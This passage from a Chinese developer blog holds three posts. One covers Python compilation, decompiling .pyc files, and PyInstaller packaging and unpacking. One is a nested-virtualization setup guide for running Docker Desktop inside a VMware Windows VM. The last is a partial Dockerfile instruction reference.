<h2 id="py—-gt-pyc"><a href="#py—-gt-pyc" class="headerlink" title="py—&gt;pyc"></a>py—&gt;pyc</h2><h3 id="将单个文件转化成pyc文件"><a href="#将单个文件转化成pyc文件" class="headerlink" title="将单个文件转化成pyc文件"></a>将单个文件转化成pyc文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> py_compile</span><br><span class="line"></span><br><span class="line">py_compile.<span class="built_in">compile</span>(<span class="string">&#x27;test.py&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python3 -m py_compile test.py</span><br></pre></td></tr></table></figure>
<h3 id="将目录下所有py文件转换成pyc文件"><a href="#将目录下所有py文件转换成pyc文件" class="headerlink" title="将目录下所有py文件转换成pyc文件"></a>将目录下所有py文件转换成pyc文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> compileall</span><br><span class="line"></span><br><span class="line">compileall.compile_dir(<span class="string">r&#x27;C:\Users\abc\Desktop\release_project&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m compileall C:\Users\abc\Desktop\release_project</span><br></pre></td></tr></table></figure>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/HByang/p/13223118.html">py文件转换成pyc文件</a></p>
<h2 id="pyc—-gt-py"><a href="#pyc—-gt-py" class="headerlink" title="pyc—&gt;py"></a>pyc—&gt;py</h2><h3 id="使用在线网站"><a href="#使用在线网站" class="headerlink" title="使用在线网站"></a>使用在线网站</h3><p><a href="https://tool.lu/pyc/">pyc在线反编译</a></p>
<h3 id="使用uncompyle6"><a href="#使用uncompyle6" class="headerlink" title="使用uncompyle6"></a>使用uncompyle6</h3><h4 id="安装库"><a href="#安装库" class="headerlink" title="安装库"></a>安装库</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install uncompyle6</span><br></pre></td></tr></table></figure>
<h4 id="反编译命令"><a href="#反编译命令" class="headerlink" title="反编译命令"></a>反编译命令</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">uncompyle6 xxx.pyc&gt;xxx.py</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o xxx.py xxx.pyc</span><br></pre></td></tr></table></figure>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>对于不是pyc后缀结尾的文件，使用uncompyle6反编译时会报出 <em>must point to a Python source that can be compiled, or Python bytecode (.pyc, .pyo)</em> 的错误。</p>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.zhihu.com/question/22842559">.pyc反编译为.py</a></p>
<h2 id="py—-gt-exe"><a href="#py—-gt-exe" class="headerlink" title="py—&gt;exe"></a>py—&gt;exe</h2><h3 id="使用pyinstaller"><a href="#使用pyinstaller" class="headerlink" title="使用pyinstaller"></a>使用pyinstaller</h3><h4 id="安装库-1"><a href="#安装库-1" class="headerlink" title="安装库"></a>安装库</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure>
<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> say_hello <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;程序开始执行&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(say_hello(<span class="string">&#x27;孙悟空&#x27;</span>))</span><br><span class="line"><span class="comment"># 增加调用main()函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="生成单个的可执行文件"><a href="#生成单个的可执行文件" class="headerlink" title="生成单个的可执行文件"></a>生成单个的可执行文件</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyinstaller -F app.py</span><br></pre></td></tr></table></figure>
<p>执行上面命令，将看到详细的生成过程。当生成完成后，将会在此 app 目录下看到多了一个 dist 目录，并在该目录下看到有一个 app.exe 文件，这就是使用 PyInstaller 工具生成的 EXE 程序。</p>
<p>在命令行窗口中进入 dist 目录下，在该目录执行 app.exe ，由于该程序没有图形用户界面，因此如果读者试图通过双击来运行该程序，则只能看到程序窗口一闪就消失了，这样将无法看到该程序的输出结果。</p>
<h4 id="生成一个目录（包含多个文件）作为可执行程序"><a href="#生成一个目录（包含多个文件）作为可执行程序" class="headerlink" title="生成一个目录（包含多个文件）作为可执行程序"></a>生成一个目录（包含多个文件）作为可执行程序</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyinstaller -D app.py</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">-h，—help</th>
<th>查看该模块的帮助信息</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-F，-onefile</td>
<td>产生单个的可执行文件</td>
</tr>
<tr>
<td style="text-align:left">-D，—onedir</td>
<td>产生一个目录（包含多个文件）作为可执行程序</td>
</tr>
<tr>
<td style="text-align:left">-a，—ascii</td>
<td>不包含 Unicode 字符集支持</td>
</tr>
<tr>
<td style="text-align:left">-d，—debug</td>
<td>产生 debug 版本的可执行文件</td>
</tr>
<tr>
<td style="text-align:left">-w，—windowed，—noconsolc</td>
<td>指定程序运行时不显示命令行窗口（仅对 Windows 有效）</td>
</tr>
<tr>
<td style="text-align:left">-c，—nowindowed，—console</td>
<td>指定使用命令行窗口运行程序（仅对 Windows 有效）</td>
</tr>
<tr>
<td style="text-align:left">-o DIR，—out=DIR</td>
<td>指定 spec 文件的生成目录。如果没有指定，则默认使用当前目录来生成 spec 文件</td>
</tr>
<tr>
<td style="text-align:left">-p DIR，—path=DIR</td>
<td>设置 Python 导入模块的路径（和设置 PYTHONPATH 环境变量的作用相似）。也可使用路径分隔符（Windows 使用分号，Linux 使用冒号）来分隔多个路径</td>
</tr>
<tr>
<td style="text-align:left">-n NAME，—name=NAME</td>
<td>指定项目（产生的 spec）名字。如果省略该选项，那么第一个脚本的主文件名将作为 spec 的名字</td>
</tr>
<tr>
<td style="text-align:left">-k  —key</td>
<td>加密打包，需要使用pycrypto库</td>
</tr>
</tbody>
</table>
</div>
<h4 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h4><p>pycryprodome库与pyinstaller不兼容，解决方案参考以下文章。</p>
<p><a href="https://blog.csdn.net/wn0112/article/details/107538700">[Python] Pyinstaller 使用 —key 参数后程序无法运行</a></p>
<p><a href="https://blog.csdn.net/JasonGe1984/article/details/104756776">pyinstaller —key加密打包问题</a></p>
<p><a href="https://blog.csdn.net/qq_16166591/article/details/100624505">pycrypto打包错误</a></p>
<h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://c.biancheng.net/view/2690.html">Python PyInstaller安装和使用教程（详解版）</a></p>
<h2 id="exe—-gt-pyc—-gt-py"><a href="#exe—-gt-pyc—-gt-py" class="headerlink" title="exe—&gt;pyc—&gt;py"></a>exe—&gt;pyc—&gt;py</h2><h3 id="使用pyinstxtractor"><a href="#使用pyinstxtractor" class="headerlink" title="使用pyinstxtractor"></a>使用pyinstxtractor</h3><h4 id="下载并使用pyinstxtractor解包"><a href="#下载并使用pyinstxtractor解包" class="headerlink" title="下载并使用pyinstxtractor解包"></a>下载并使用pyinstxtractor解包</h4><p>地址：<a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re</a></p>
<p>使用git</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://ghproxy.com/https://github.com/extremecoders-re/pyinstxtractor.git</span><br></pre></td></tr></table></figure>
<p>命令行执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python ./pyinstxtractor/pyinstxtractor.py ./task.exe</span><br></pre></td></tr></table></figure>
<p>运行后生成<code>xx.exe_extracted</code>文件夹 ，里面有一堆<code>dll</code> ,<code>pyd</code>等文件，我们需要注意的是里面有一个<code>xxx.exe.manifest</code>文件，<code>xxx</code>可能与你的exe文件名不同，但这才是它的真实名字。然后<strong>找到一个叫<code>xxx</code>的没有后缀名的文件</strong>，它其实就是你之前打包的那个<code>.py</code>文件对应的<code>pyc</code>文件。</p>
<p>我们还注意到此目录下还有一个<code>PYZ-00.pyz_extracted</code>文件夹，里面都是引入的<strong>依赖库</strong>，当然，我们自己写的<code>mylib.py</code>也在其中，它也是我们反编译的对象。</p>
<h4 id="反编译pyc"><a href="#反编译pyc" class="headerlink" title="反编译pyc"></a>反编译pyc</h4><p>但直接将我们找到的<code>pyc</code>文件上传会发现无法反编译。原因是什么呢？我们用<strong>十六进制编辑器</strong>（大家网上搜就行，我这里用的是winhex，之前直接运行<code>py</code>文件生成的<code>pyc</code>文件比较。</p>
<p>发现唯一的差别就是<strong>少了第一行16个字节</strong>（叫做 <em>magic number</em> 表示python的版本和编译时间），那我们把它加上是不是就能正常解析了呢？确实是这样，但没有原始<code>pyc</code>文件怎么办？我们再到<code>xx.exe_extracted</code>文件夹里找一找。会发现有一个叫<code>struct</code>的文件，我们给他加上后缀<code>.pyc</code>反编译试试。成功了。</p>
<p>这就说明它的 <em>magic number</em> 是正确的，那我们只要把它的前16个字节复制过去不就行了？我们再来试试，成了！<code>main.py</code>中的内容被成功反编译出来了。</p>
<p>下面同理也能反编译出<code>mylib.py</code>等依赖库中的内容，不过值得<strong>注意</strong>的是，网上很多教程都没有提到<strong>依赖库的<code>pyc</code>文件缺少的字节数与主程序的不同！！！</strong></p>
<p><strong>反编译成功！</strong>不过中文字符被解析成了Unicode编码，可以再使用相应工具转换。</p>
<h4 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://zhuanlan.zhihu.com/p/109266820">谈谈 Pyinstaller 的编译和反编译，如何保护你的代码</a></p>
]]></content>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟化嵌套搭建指南</title>
    <url>/2022/10/13/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B5%8C%E5%A5%97%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="虚拟化嵌套搭建指南"><a href="#虚拟化嵌套搭建指南" class="headerlink" title="虚拟化嵌套搭建指南"></a>虚拟化嵌套搭建指南</h1><p>说通俗点，在虚拟机中使用hyper-v</p>
<span id="more"></span>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        作为一个docker使用者，在开发和调试的过程中使用繁琐的命令行是比较折磨的。尤其是像我这种对命令不熟悉的小白，每次都要翻越手册和笔记。于是，docker官方提供了能运行在3个系统上的docker desktop，并且随着版本不断地更新和迭代，docker desktop已经能覆盖绝大多数学习时用到的命令，极大程度简化了学习成本。</p>
<p>​        可以这么说，如果你是刚入门的小白，把docker基础命令过一遍，然后再去使用docker desktop，可以让你直接成为一个半资深的docker使用者。</p>
<p>​        但是，由于docker desktop安装时默认安装c盘，只能通过软连接的方式把应用装到其他盘里，再通过一系列高端技巧把镜像仓库也运到别的盘里（反正我失败了）。而我们知道，往往一个镜像就几百MB甚至几GB的大小，下载下来后，你还需要本地进行修改保存。这样下来，docker吃起空间来完全是不讲道理的。那么能不能把docker desktop扔到移动硬盘上去，即插即用呢？</p>
<p>​        于是，我想到了使用虚拟机VMware Station 16 pro，搭建一台win10虚拟机，并把它储存在移动硬盘上。正巧的是，微软官网最近也写了相关的文章，进一步证明了这一操作的可行性。</p>
<p><a href="https://learn.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/tlfs/nested-virtualization">嵌套虚拟化</a></p>
<p><a href="https://learn.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/user-guide/nested-virtualization">借助嵌套虚拟化在虚拟机中运行 Hyper-V</a></p>
<h2 id="本机操作流程"><a href="#本机操作流程" class="headerlink" title="本机操作流程"></a>本机操作流程</h2><h3 id="检查本机cpu是否开启虚拟机"><a href="#检查本机cpu是否开启虚拟机" class="headerlink" title="检查本机cpu是否开启虚拟机"></a>检查本机cpu是否开启虚拟机</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671530871185-e4b3b914-3fb0-4844-bab1-bacc9a853586.png" alt="image-20221013133435372"></p>
<p>这个没什么好说的，默认都开了，没开的去BIOS里慢慢折腾吧。</p>
<h3 id="更新VMware到最新版本"><a href="#更新VMware到最新版本" class="headerlink" title="更新VMware到最新版本"></a>更新VMware到最新版本</h3><p>（当前为16.2.4 build-20089737）</p>
<p>大坑来了。在更新的过程中，疯狂提示这个报错</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671530875941-4620ab1a-99a9-46fb-9274-504fb3821cd7.png" alt="image-20221013133834326"></p>
<p>笑嘻了，这不有手就行？</p>
<p>点开这个，找个最新的下载一下，重启一下，完事咯~</p>
<p><a href="https://learn.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist?view=msvc-170">Microsoft Visual C++ Redistributable latest supported downloads</a></p>
<p>感觉就是在侮辱我的智商。找个x64版本下载、安装、重启，点开VMware的更新，依然报这个错。于是折腾了一下午，想了很多可能出现问题的地方，依然无果。就是因为这个报错，差点直接让我放弃了进一步操作的念头。因为我也没有经验，只不过在零星的资料中，判断这一步可能是比较关键的一步。</p>
<p>那么这个bug到底是怎么解决的呢？</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671530880479-3ab1b8f2-a183-456f-8db7-0f00fb1c07df.png" alt="image-20221013134556235"></p>
<p>麻了，在刚刚的链接里找个x86版本下载、安装、重启，更新完毕。焯！</p>
<h3 id="升级虚拟机"><a href="#升级虚拟机" class="headerlink" title="升级虚拟机"></a>升级虚拟机</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671530884241-ab8e1d03-3c7b-45f5-8450-c719e23dc5d5.png" alt="image-20221013134759053"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671530887427-3725078e-14f7-4f0d-b2a5-a445a998055b.png" alt="image-20221013135256244"></p>
<h3 id="更改虚拟机设置"><a href="#更改虚拟机设置" class="headerlink" title="更改虚拟机设置"></a>更改虚拟机设置</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671530894722-a1f8ebe9-3b20-470f-a671-8b1691a3e603.png" alt="image-20221013135533199"></p>
<p>在处理器的虚拟化引擎里勾选第一项。然后看看能不能开启虚拟机。当然，如果这个时候启动成功没有报错，那么恭喜，你已经成功了。</p>
<h3 id="启动时报错此平台不支持虚拟化的Intel-VT-x-EPT"><a href="#启动时报错此平台不支持虚拟化的Intel-VT-x-EPT" class="headerlink" title="启动时报错此平台不支持虚拟化的Intel VT-x/EPT"></a>启动时报错此平台不支持虚拟化的Intel VT-x/EPT</h3><p>第二个大坑来了</p>
<h4 id="启用或关闭windows功能"><a href="#启用或关闭windows功能" class="headerlink" title="启用或关闭windows功能"></a>启用或关闭windows功能</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">功能名称</th>
<th style="text-align:center">开关状态</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Windows沙盒</td>
<td style="text-align:center">关闭</td>
</tr>
<tr>
<td style="text-align:center">Hyper-V(家庭版是没有的)</td>
<td style="text-align:center">关闭</td>
</tr>
<tr>
<td style="text-align:center">虚拟机平台</td>
<td style="text-align:center">打开</td>
</tr>
</tbody>
</table>
</div>
<h4 id="关闭内核隔离"><a href="#关闭内核隔离" class="headerlink" title="关闭内核隔离"></a>关闭内核隔离</h4><p>打开Windows安全中心&gt;设备安全性&gt;内核隔离，关闭</p>
<h4 id="cmd输入"><a href="#cmd输入" class="headerlink" title="cmd输入"></a>cmd输入</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>
<h4 id="重启电脑"><a href="#重启电脑" class="headerlink" title="重启电脑"></a>重启电脑</h4><p>此时再次打开虚拟机，应该没有什么问题了</p>
<h2 id="win10虚拟机操作流程"><a href="#win10虚拟机操作流程" class="headerlink" title="win10虚拟机操作流程"></a>win10虚拟机操作流程</h2><p>这个就是正常的安装docker的操作了，没什么难点和坑点，在我之前的笔记里也有详细地介绍。</p>
<h3 id="方便本机访问虚拟机"><a href="#方便本机访问虚拟机" class="headerlink" title="方便本机访问虚拟机"></a>方便本机访问虚拟机</h3><p>桥接+复制，开机后ipconfig即可。</p>
<h3 id="启动docker-desktop报错wsl出了问题"><a href="#启动docker-desktop报错wsl出了问题" class="headerlink" title="启动docker desktop报错wsl出了问题"></a>启动docker desktop报错wsl出了问题</h3><p>下载一个wsl.msi，安装完重启一下虚拟机即可。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/weixin_44047784/article/details/122209100">VMWare安装报错：此安装程序要求您重新启动系统以完成 Microsoft VC Redistributable安装，然后重新运行该安装程序。</a></p>
<p><a href="https://blog.csdn.net/u013511036/article/details/126049334">此平台不支持虚拟化的Intel VT-x/EPT</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用秘籍(2)</title>
    <url>/2022/06/22/Docker%E4%BD%BF%E7%94%A8%E7%A7%98%E7%B1%8D-2/</url>
    <content><![CDATA[<h1 id="Docker使用秘籍（2）"><a href="#Docker使用秘籍（2）" class="headerlink" title="Docker使用秘籍（2）"></a>Docker使用秘籍（2）</h1><p>本部分介绍Dockerfile的编写。</p>
<span id="more"></span>
<h2 id="Dockerfile使用方法"><a href="#Dockerfile使用方法" class="headerlink" title="Dockerfile使用方法"></a>Dockerfile使用方法</h2><h3 id="利用dockerfile构筑一个镜像"><a href="#利用dockerfile构筑一个镜像" class="headerlink" title="利用dockerfile构筑一个镜像"></a>利用dockerfile构筑一个镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br></pre></td></tr></table></figure>
<h4 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h4><p><code>.</code>表示上下文路径。请勿将无用文件放入路径中，这样会导致镜像过大。</p>
<h3 id="dockerfile基本语法"><a href="#dockerfile基本语法" class="headerlink" title="dockerfile基本语法"></a>dockerfile基本语法</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install wget \</span></span><br><span class="line"><span class="bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; tar -xvf redis.tar.gz</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大.</p>
<h3 id="dockerfile指令简洁版摘要"><a href="#dockerfile指令简洁版摘要" class="headerlink" title="dockerfile指令简洁版摘要"></a>dockerfile指令简洁版摘要</h3><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>FROM</strong></td>
<td>构建镜像基于哪个镜像</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>镜像维护者姓名或邮箱地址</td>
</tr>
<tr>
<td><strong>RUN</strong></td>
<td>构建镜像时运行的指令</td>
</tr>
<tr>
<td><strong>CMD</strong></td>
<td>运行容器时执行的shell环境</td>
</tr>
<tr>
<td>VOLUME</td>
<td>指定容器挂载点到宿主机自动生成的目录或其他容器</td>
</tr>
<tr>
<td>USER</td>
<td>为RUN、CMD、和 ENTRYPOINT 执行命令指定运行用户</td>
</tr>
<tr>
<td><strong>WORKDIR</strong></td>
<td>为 RUN、CMD、ENTRYPOINT、COPY 和 ADD 设置工作目录，就是切换目录</td>
</tr>
<tr>
<td>HEALTHCHECH</td>
<td>健康检查</td>
</tr>
<tr>
<td>ARG</td>
<td>构建时指定的一些参数</td>
</tr>
<tr>
<td><strong>EXPOSE</strong></td>
<td>声明容器的服务端口（仅仅是声明）</td>
</tr>
<tr>
<td><strong>ENV</strong></td>
<td>设置容器环境变量</td>
</tr>
<tr>
<td>ADD</td>
<td>拷贝文件或目录到容器中，如果是URL或压缩包便会自动下载或自动解压</td>
</tr>
<tr>
<td><strong>COPY</strong></td>
<td>拷贝文件或目录到容器中，跟ADD类似，但不具备自动下载或解压的功能</td>
</tr>
<tr>
<td><strong>ENTRYPOINT</strong></td>
<td>运行容器时执行的shell命令</td>
</tr>
</tbody>
</table>
</div>
<h3 id="详细讲解"><a href="#详细讲解" class="headerlink" title="详细讲解"></a>详细讲解</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p>
<h4 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h4><p>用于执行后面跟着的命令行命令。有以下俩种格式：</p>
<p>shell:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> &lt;命令行命令&gt;</span></span><br><span class="line"><span class="comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></span><br></pre></td></tr></table></figure>
<p>exec:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> [<span class="string">&quot;可执行文件&quot;</span>, <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>]</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line"><span class="comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure>
<h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] [<span class="string">&quot;&lt;源路径1&gt;&quot;</span>,...  <span class="string">&quot;&lt;目标路径&gt;&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p><strong>[—chown=<user>:<group>]</strong>：可选参数，用户改变复制到容器内文件的拥有者和属组。</p>
<p><strong>&lt;源路径&gt;</strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。</p>
<p><strong>&lt;目标路径&gt;</strong>：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p>
<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>ADD 指令和 COPY 的使用格类似（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p>
<ul>
<li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li>
<li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li>
</ul>
<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p>
<ul>
<li>CMD 在docker run 时运行。</li>
<li>RUN 是在 docker build。</li>
</ul>
<p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p>
<p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> &lt;shell 命令&gt; </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...] </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]  <span class="comment"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span></span><br></pre></td></tr></table></figure>
<p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p>
<h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p>
<p>但是, 如果运行 docker run 时使用了 —entrypoint 选项，将覆盖 ENTRYPOINT 指令指定的程序。</p>
<p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p>
<p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;&lt;executeable&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]</span></span><br></pre></td></tr></table></figure>
<p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参。</p>
<h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="keyword">ENV</span> &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br></pre></td></tr></table></figure>
<h4 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h4><p>构建参数，与 ENV 作用一致。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p>
<p>构建命令 docker build 中可以用 —build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> &lt;参数名&gt;[=&lt;默认值&gt;]</span><br></pre></td></tr></table></figure>
<h4 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h4><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p>
<p>作用：</p>
<ul>
<li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li>
<li>避免容器不断变大。</li>
</ul>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;&lt;路径1&gt;&quot;</span>, <span class="string">&quot;&lt;路径2&gt;&quot;</span>...]</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> &lt;路径&gt;</span></span><br></pre></td></tr></table></figure>
<p>在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。</p>
<h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>仅仅只是声明端口。</p>
<p>作用：</p>
<ul>
<li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li>
<li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li>
</ul>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPOSE</span> &lt;端口<span class="number">1</span>&gt; [&lt;端口<span class="number">2</span>&gt;...]</span><br></pre></td></tr></table></figure>
<h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p>
<p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> &lt;工作目录路径&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p>
<p>格式：</p>
